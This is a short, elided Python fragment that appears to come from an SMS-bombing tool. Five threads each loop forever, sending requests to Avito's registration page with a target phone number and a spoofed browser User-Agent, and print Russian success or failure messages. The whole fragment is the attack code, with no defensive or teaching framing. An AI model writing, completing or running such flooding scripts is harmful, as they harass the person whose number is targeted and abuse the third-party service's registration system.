...
def mainthread():
    ...
    while True:
        ...
        try:
            requests.get('https://www.avito.ru/penza#registration', data={'phone': _phone},headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Авито отправлено!')
        except:
            print('[-] Не отправлено!')
...
for i in range(5):
    time.sleep(0.2)
    t = threading.Thread(target=mainthread,args=())
    t.start()
